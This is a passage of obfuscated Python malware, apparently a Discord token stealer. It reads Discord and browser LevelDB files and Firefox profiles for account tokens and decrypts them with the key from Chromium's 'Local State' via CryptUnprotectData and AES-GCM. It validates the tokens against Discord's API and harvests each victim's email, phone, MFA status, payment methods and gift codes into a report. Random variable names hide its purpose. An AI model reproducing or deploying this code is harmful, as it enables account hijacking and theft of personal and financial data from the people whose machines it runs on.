                for v4r_file_name in os.listdir(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL = os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_file_name)
                    if os.path.exists(QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL):
                        with open(QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(ESOHHSRXJNKUJZYSXCFYFULFVYMLGBWDSKFYNFOKDEITKOXACWKWYLXCM_enc, v4r_line.strip()):
                                    VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA = TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMPVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), BNMUPVSSCLRTESZZQAIPQMKCYJFBGPUNRBJVCRGLXGLIVXWGUATXNLTYTDXSFDNGHOTVATXBSHXP(os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, AULZEXAMYMDBXDZPVWKFUFBWMUREQNQGBDWDPOQKJIIYQHDUXNGA, 'Local State')))
                                    if ZMKUAWDZMSNWJQNUCJDZZSEBSYFSZIEEJPFDSMNKASZAQJORUZM(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA, WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO):
                                        BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL = requests.get(WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO, headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA}).json()['id']
                                        if BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL not in FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK:
                                            AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK.append(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA)
                                            FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK.append(BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL)
                                            WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS[VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA] = (WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL)
            else:
                for v4r_file_name in os.listdir(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL = os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_file_name)
                    if os.path.exists(QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL):
                        with open(QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA in re.findall(ESOHHSRXJNKUJZYSXCFYFULFVYMLGBWDSKFYNFOKDEITKOXACWKWYLXCM, v4r_line.strip()):
                                    if ZMKUAWDZMSNWJQNUCJDZZSEBSYFSZIEEJPFDSMNKASZAQJORUZM(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA, WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO):
                                        BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL = requests.get(WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO, headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA}).json()['id']
                                        if BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL not in FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK:
                                            AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK.append(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA)
                                            FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK.append(BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL)
                                            WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS[VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA] = (WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QFUOHOXVRBCLJEPAGTKDBAFCHHIDYTNWMRTDTDNXROFLWVVSFRFUKCCL)

        if os.path.exists(os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Mozilla", "Firefox", "Profiles")):
            for ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, _, v4r_files in os.walk(os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA in re.findall(ESOHHSRXJNKUJZYSXCFYFULFVYMLGBWDSKFYNFOKDEITKOXACWKWYLXCM, v4r_line.strip()):
                                    if ZMKUAWDZMSNWJQNUCJDZZSEBSYFSZIEEJPFDSMNKASZAQJORUZM(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA, WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO):
                                        BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL = requests.get(WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO, headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA}).json()['id']
                                        if BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL not in FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK:
                                            AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK.append(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA)
                                            FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK.append(BVBEYURTSQIYTZSGYUFIEUAGAXQQAZSERWDTUOYKUQUZQQPUDLAQQMXONHAZSVHNNUTLNL)
                                            WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS[VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA] = ('Firefox', os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r__file))
        return AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK, WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS

    def ZMKUAWDZMSNWJQNUCJDZZSEBSYFSZIEEJPFDSMNKASZAQJORUZM(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA, WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO):
        return requests.get(WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO, headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA}).status_code == 200

    def TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMPVal(CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD):
        YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG = CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK[3:15]
        XDUQLWQGPXNDQHRXGCIXVLTONZSRNIJXZZIANXVAYNCXKQZEPNYUH = CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK[15:]
        KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ = AES.new(JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD, AES.MODE_GCM, YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG)
        return KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ.decrypt(XDUQLWQGPXNDQHRXGCIXVLTONZSRNIJXZZIANXVAYNCXKQZEPNYUH)[:-16].decode()

    def BNMUPVSSCLRTESZZQAIPQMKCYJFBGPUNRBJVCRGLXGLIVXWGUATXNLTYTDXSFDNGHOTVATXBSHXP(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
        if not os.path.exists(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
            return None
        with open(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, "r", encoding="utf-8") as v4r_f:
            GBHDKWFSITJCTQCFEUEORWGOZDAPVGZURRWIZRZRPYHNIXVDNEACGVYYXKATSGBHPQCFVPALCTCFRB = json.load(v4r_f)
        JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD = base64.b64decode(GBHDKWFSITJCTQCFEUEORWGOZDAPVGZURRWIZRZRPYHNIXVDNEACGVYYXKATSGBHPQCFVPALCTCFRB["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD, None, None, None, 0)[1]

    AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK, WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS = PHUFGEVVASASQYQRUOXLBTFFSROPRTOLFADUJXTTZKWDMELXLSOJLAFOCHLZRWDMBOFQOKMSPZRIYZUMZVGYFMOLBSBWWWRU()
    
    if not AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK:
        ASIVVNHMWZLBZIALNFLTPPYJILMEDRNSYXIZOBUPXNCJVSJLBNLWGBECOUQFTGJGJDHB = "No discord tokens found."

    for VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd in AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK:
        PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG += 1

        try: PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd}).json()
        except: PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = {"None": "None"}

        XLFDGYNOACYCUDTIWZUWBEUCYUVYVVPHGQVLHKNSCEIPXRHDSMLNIYKLRVSRVIZKTF = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('username', "None") + '#' + PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('discriminator', "None")
        CLNOJHOKMFJWGRDEPQOLXWOKSQIYMZMQTVHBPBSNPLNGGUGECDXNUZILNIGUUIMKNUKGGECNDFTISIHXQSOQVSI = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('global_name', "None")
        RDRCZZEXXXOKGATPFXYKERVIEWBVTRQWKFZXBSZMUCFSASWBQVM = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('id', "None")
        HREGEDORVKVPWYARXLBSCZWHSAKFEBOYXTWCEJAMSHVFRAHROTOSWYIVWTJJCZZZZJOUVMTUCATMYCXKJQNRPJSL = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('email', "None")
        CAWRPCBILDSRCKCOVUXETFVDMRTSVRYULMHENNCFBJTSXBSBQAAFSLFAMRWOHEBWBKFOWEOKWRIIITQDXAQFMOD = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('verified', "None")
        FASZFCJIZZPRFTVFXWSURAMQGNLDUMLLZTUDZABFOODAOPHGBRJPNMEIRWG = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('phone', "None")
        STLAPCPIOUTKESQZGSPXULGSHPKSHMNTOOQITKCEBQKLVUVZXCECTCZDXJPZSKOYIEEEYV = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('locale', "None")
        NSEHVSFFMKFHNUBARROXHEZBEEMSQWQCMAXNYWMLDBCIRIOTONKVBJCODOZTHZPW = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('mfa_enabled', "None")

        try:
            if PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('premium_type', 'None') == 0:
                FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = 'False'
            elif PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('premium_type', 'None') == 1:
                FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = 'Nitro Classic'
            elif PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('premium_type', 'None') == 2:
                FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = 'Nitro Boosts'
            elif PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('premium_type', 'None') == 3:
                FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = 'Nitro Basic'
            else:
                FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = 'False'
        except:
            FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO = "None"

        try: GQSWTSDPXCSSMVNVHJIVYFXSTRTAUOYDTFVUBWNJNGRDZBMNLTXCUHWQMHSXDGIITPYNVFHMYSCEVGQXHSNWVRVO = f"https://cdn.discordapp.com/avatars/{RDRCZZEXXXOKGATPFXYKERVIEWBVTRQWKFZXBSZMUCFSASWBQVM}/{PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{RDRCZZEXXXOKGATPFXYKERVIEWBVTRQWKFZXBSZMUCFSASWBQVM}/{PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{RDRCZZEXXXOKGATPFXYKERVIEWBVTRQWKFZXBSZMUCFSASWBQVM}/{PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI['avatar']}.png"
        except: GQSWTSDPXCSSMVNVHJIVYFXSTRTAUOYDTFVUBWNJNGRDZBMNLTXCUHWQMHSXDGIITPYNVFHMYSCEVGQXHSNWVRVO = "None"

        try:
            WCKOHWKAIAXBEVFVOTUBHLAWUPVHMYKDRDGRFLTRAWGYVDTFIAWZJEZHPQDBXKZNIWGJXB = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd}).json()
            if WCKOHWKAIAXBEVFVOTUBHLAWUPVHMYKDRDGRFLTRAWGYVDTFIAWZJEZHPQDBXKZNIWGJXB:
                AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT = []

                for v4r_method in WCKOHWKAIAXBEVFVOTUBHLAWUPVHMYKDRDGRFLTRAWGYVDTFIAWZJEZHPQDBXKZNIWGJXB:
                    if v4r_method['type'] == 1:
                        AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT.append("Paypal")
                    else:
                        AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT.append('Other')
                AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT = ' / '.join(AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT)
            else:
                AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT = "None"
        except:
            AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT = "None"

        try:
            WQYWPYDPPKUXNRLLYPWQJUHJLPEVIJUNELPZNFSQAKPCYMDVWQMCFEFCFZZYXFVLACWEUQLZYAKJBBAZGYESIMLYBMXOUZ = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd}).json()
            if WQYWPYDPPKUXNRLLYPWQJUHJLPEVIJUNELPZNFSQAKPCYMDVWQMCFEFCFZZYXFVLACWEUQLZYAKJBBAZGYESIMLYBMXOUZ:
                IIOGZDEYCXXQRGEFZHDCVFAIKTFGGSSJZIFTJABNCGZLSVBKJZPAGZEDTBIZUOZYCYFHSXMGGAJRG = []
                for FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP in WQYWPYDPPKUXNRLLYPWQJUHJLPEVIJUNELPZNFSQAKPCYMDVWQMCFEFCFZZYXFVLACWEUQLZYAKJBBAZGYESIMLYBMXOUZ:
                    WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ = FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP['promotion']['outbound_title']
                    FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP = FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP['code']
                    KIJHVNKDLTDNCLSMFSZRGTCQZLUWQYUHMDSZCYGCIWCKXPCHBQWJTXHXKNRGJEUEAODZZFFFGLRGFYEJGU = f"Gift: \"{WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ}\" Code: \"{FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP}\""
                    if len('\n\n'.join(FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP)) + len(KIJHVNKDLTDNCLSMFSZRGTCQZLUWQYUHMDSZCYGCIWCKXPCHBQWJTXHXKNRGJEUEAODZZFFFGLRGFYEJGU) >= 1024:
                        break
                    IIOGZDEYCXXQRGEFZHDCVFAIKTFGGSSJZIFTJABNCGZLSVBKJZPAGZEDTBIZUOZYCYFHSXMGGAJRG.append(KIJHVNKDLTDNCLSMFSZRGTCQZLUWQYUHMDSZCYGCIWCKXPCHBQWJTXHXKNRGJEUEAODZZFFFGLRGFYEJGU)
                if len(IIOGZDEYCXXQRGEFZHDCVFAIKTFGGSSJZIFTJABNCGZLSVBKJZPAGZEDTBIZUOZYCYFHSXMGGAJRG) > 0:
                    FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP = '\n\n'.join(IIOGZDEYCXXQRGEFZHDCVFAIKTFGGSSJZIFTJABNCGZLSVBKJZPAGZEDTBIZUOZYCYFHSXMGGAJRG)
                else:
                    FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP = "None"
            else:
                FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP = "None"
        except:
            FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP = "None"
    
        try: v4r_software_name, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX = WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS.get(VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX = "Unknown", "Unknown"

        ASIVVNHMWZLBZIALNFLTPPYJILMEDRNSYXIZOBUPXNCJVSJLBNLWGBECOUQFTGJGJDHB = ASIVVNHMWZLBZIALNFLTPPYJILMEDRNSYXIZOBUPXNCJVSJLBNLWGBECOUQFTGJGJDHB + f"""
Discord Account n°{str(PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG)}:
 - Path Found      : {ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX}
 - Software        : {v4r_software_name}
